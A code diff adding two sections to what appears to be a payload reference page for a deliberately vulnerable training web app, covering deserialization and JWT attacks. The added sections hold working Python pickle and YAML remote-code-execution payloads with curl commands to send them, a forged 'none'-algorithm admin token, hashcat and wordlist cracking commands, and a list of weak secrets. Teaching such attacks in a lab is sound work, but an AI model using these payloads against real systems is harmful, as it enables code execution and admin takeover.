@@ -439,6 +439,94 @@ PUT /api/profile/update
               </div>
             </AccordionContent>
           </AccordionItem>
+
+          <AccordionItem value="deserialization" className="card-cyber border-none">
+            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
+              <div className="flex items-center space-x-3">
+                <Package className="w-5 h-5 text-pink-400" />
+                <span>Deserialization Payloads</span>
+              </div>
+            </AccordionTrigger>
+            <AccordionContent className="px-6 pb-4">
+              <div className="space-y-4">
+                <CodeBlock code={`# Python Pickle RCE Payload Generator
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+
+# Send to /api/deserialize
+curl -X POST /api/deserialize \\
+  -H "Content-Type: application/json" \\
+  -d '{"data": "<base64_payload>", "format": "pickle"}'
+
+# YAML Deserialization RCE
+!!python/object/apply:os.system ['id']
+!!python/object/apply:subprocess.check_output [['whoami']]
+
+# Send to /api/cache/restore
+curl -X POST /api/cache/restore \\
+  -H "Content-Type: text/plain" \\
+  -d "!!python/object/apply:os.system ['id']"
+
+# Session Load (GET request RCE)
+# Generate URL-safe base64 pickle payload
+import base64
+payload = base64.urlsafe_b64encode(pickle.dumps(RCE())).decode()
+curl "/api/session/load?data=<payload>"`} />
+              </div>
+            </AccordionContent>
+          </AccordionItem>
+
+          <AccordionItem value="jwt" className="card-cyber border-none">
+            <AccordionTrigger className="px-6 py-4 font-rajdhani text-lg text-white hover:no-underline">
+              <div className="flex items-center space-x-3">
+                <Key className="w-5 h-5 text-cyan-400" />
+                <span>JWT Attack Payloads</span>
+              </div>
+            </AccordionTrigger>
+            <AccordionContent className="px-6 pb-4">
+              <div className="space-y-4">
+                <CodeBlock code={`# JWT None Algorithm Attack
+# 1. Create token with 'none' algorithm
+curl -X POST /api/jwt/create \\
+  -H "Content-Type: application/json" \\
+  -d '{"payload": {"role": "admin", "user_id": "1"}, "algorithm": "none"}'
+
+# 2. Use forged token to access admin
+curl -X POST /api/jwt/forge-admin \\
+  -H "Content-Type: application/json" \\
+  -d '"<forged_token>"'
+
+# Manual None Algorithm Token
+# Header: {"alg": "none", "typ": "JWT"}
+# Payload: {"role": "admin"}
+# base64url(header).base64url(payload).
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+
+# JWT Secret Cracking
+# Get hints first
+curl /api/jwt/secret-hint
+
+# Use hashcat or jwt-cracker
+hashcat -m 16500 jwt.txt wordlist.txt
+python3 jwt-cracker.py -t <token> -w rockyou.txt
+
+# Common weak secrets to try:
+secret, password, 123456, admin, key
+vulnerable_secret_key_123
+
+# Algorithm Confusion (HS256 -> RS256)
+# If server uses RS256, switch to HS256 and sign with public key`} />
+              </div>
+            </AccordionContent>
+          </AccordionItem>
         </Accordion>
       </div>
 
